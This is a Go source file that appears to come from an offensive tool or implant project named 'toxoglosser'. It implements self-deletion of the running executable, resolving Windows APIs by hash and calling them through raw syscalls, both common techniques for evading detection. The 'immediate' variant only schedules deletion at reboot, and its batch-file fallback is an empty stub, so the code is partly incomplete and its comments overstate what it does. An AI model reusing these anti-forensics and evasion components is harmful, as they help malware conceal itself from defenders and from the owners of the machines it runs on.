package utils

import (
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
	"toxoglosser/common"
)

// SelfDelete attempts to delete the current executable.
// This function marks the current executable for deletion on the next system reboot
// using the MoveFileExW API with the MOVEFILE_DELAY_UNTIL_REBOOT flag.
// This is done to avoid issues that can occur when trying to delete the currently running executable.
func SelfDelete() error {
	// Get the current executable path
	executablePath, err := GetExecutablePath()
	if err != nil {
		return err
	}

	// Manually resolve MoveFileExW function
	hKernel32, err := common.GetModuleHandleByHash("kernel32.dll")
	if err != nil {
		// Fallback to LazyDLL if manual resolution fails
		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
		procMoveFileEx := kernel32.NewProc("MoveFileExW")

		ret, _, err1 := procMoveFileEx.Call(
			uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(executablePath))),
			0, // NULL destination (delete)
			uintptr(windows.MOVEFILE_DELAY_UNTIL_REBOOT),
		)

		if ret == 0 {
			return err1
		}

		return nil
	}

	addr, err := common.GetProcAddressByHash(windows.Handle(hKernel32), "MoveFileExW")
	if err != nil {
		// Fallback to LazyDLL if manual resolution fails
		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
		procMoveFileEx := kernel32.NewProc("MoveFileExW")

		ret, _, err1 := procMoveFileEx.Call(
			uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(executablePath))),
			0, // NULL destination (delete)
			uintptr(windows.MOVEFILE_DELAY_UNTIL_REBOOT),
		)

		if ret == 0 {
			return err1
		}

		return nil
	}

	// Actually call the function via raw syscall
	ret, _, err1 := syscall.SyscallN(
		addr,
		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(executablePath))),
		0, // NULL destination (delete)
		uintptr(windows.MOVEFILE_DELAY_UNTIL_REBOOT),
	)

	if ret == 0 {
		return err1
	}

	return nil
}

// SelfDeleteImmediate attempts to immediately delete the current executable
// This is riskier but ensures deletion
func SelfDeleteImmediate() error {
	// Get the current executable path
	executablePath, err := GetExecutablePath()
	if err != nil {
		return err
	}

	// Create Batch file to delete the executable and itself
	// This is a complex process that involves creating a batch script that runs after
	// our process terminates

	// For this implementation, we'll use MoveFileEx to rename the file to an invalid name
	// and mark it for deletion
	hKernel32, err := common.GetModuleHandleByHash("kernel32.dll")
	if err != nil {
		// Fallback to LazyDLL if manual resolution fails
		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
		procMoveFileEx := kernel32.NewProc("MoveFileExW")

		executablePtr := windows.StringToUTF16Ptr(executablePath)

		ret, _, _ := procMoveFileEx.Call(
			uintptr(unsafe.Pointer(executablePtr)),
			0, // NULL - indicates delete
			uintptr(windows.MOVEFILE_DELAY_UNTIL_REBOOT),
		)

		if ret == 0 {
			// If we can't schedule for delete on reboot, try a different approach
			// by using a batch file to delete after exit
			return createSelfDeleteBatch(executablePath)
		}

		return nil
	}

	addr, err := common.GetProcAddressByHash(windows.Handle(hKernel32), "MoveFileExW")
	if err != nil {
		// Fallback to LazyDLL if manual resolution fails
		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
		procMoveFileEx := kernel32.NewProc("MoveFileExW")

		executablePtr := windows.StringToUTF16Ptr(executablePath)

		ret, _, _ := procMoveFileEx.Call(
			uintptr(unsafe.Pointer(executablePtr)),
			0, // NULL - indicates delete
			uintptr(windows.MOVEFILE_DELAY_UNTIL_REBOOT),
		)

		if ret == 0 {
			// If we can't schedule for delete on reboot, try a different approach
			// by using a batch file to delete after exit
			return createSelfDeleteBatch(executablePath)
		}

		return nil
	}

	// Actually call the function via raw syscall
	executablePtr := windows.StringToUTF16Ptr(executablePath)
	ret, _, _ := syscall.SyscallN(
		addr,
		uintptr(unsafe.Pointer(executablePtr)),
		0, // NULL - indicates delete
		uintptr(windows.MOVEFILE_DELAY_UNTIL_REBOOT),
	)

	if ret == 0 {
		// If we can't schedule for delete on reboot, try a different approach
		// by using a batch file to delete after exit
		return createSelfDeleteBatch(executablePath)
	}

	return nil
}

// GetExecutablePath returns the current executable path.
// Uses the GetModuleFileNameW API to retrieve the full path of the currently running executable.
func GetExecutablePath() (string, error) {
	var buffer [windows.MAX_PATH]uint16
	hKernel32, err := common.GetModuleHandleByHash("kernel32.dll")
	if err != nil {
		// Fallback to LazyDLL if manual resolution fails
		procGetModuleFileName := windows.NewLazySystemDLL("kernel32.dll").NewProc("GetModuleFileNameW")

		ret, _, err := procGetModuleFileName.Call(
			0, // Current module (exe)
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(len(buffer)),
		)

		if ret == 0 {
			return "", err
		}

		return windows.UTF16ToString(buffer[:]), nil
	}

	addr, err := common.GetProcAddressByHash(windows.Handle(hKernel32), "GetModuleFileNameW")
	if err != nil {
		// Fallback to LazyDLL if manual resolution fails
		procGetModuleFileName := windows.NewLazySystemDLL("kernel32.dll").NewProc("GetModuleFileNameW")

		ret, _, err := procGetModuleFileName.Call(
			0, // Current module (exe)
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(len(buffer)),
		)

		if ret == 0 {
			return "", err
		}

		return windows.UTF16ToString(buffer[:]), nil
	}

	// Actually call the function via raw syscall
	ret, _, err := syscall.SyscallN(
		addr,
		0, // Current module (exe)
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(len(buffer)),
	)

	if ret == 0 {
		return "", err
	}

	return windows.UTF16ToString(buffer[:]), nil
}

// createSelfDeleteBatch creates a batch file to delete the executable
func createSelfDeleteBatch(executablePath string) error {
	// For a complete implementation, we would:
	// 1. Create a temporary batch file
	// 2. Write commands to delete the executable and the batch file itself
	// 3. Schedule the batch file to run on exit
	
	// This is a simplified representation
	// In a real implementation, you would create a batch script that runs after
	// this process exits to clean up the executable
	
	// For now, we'll just return nil - a full implementation would require more
	// complex process management
	
	return nil
}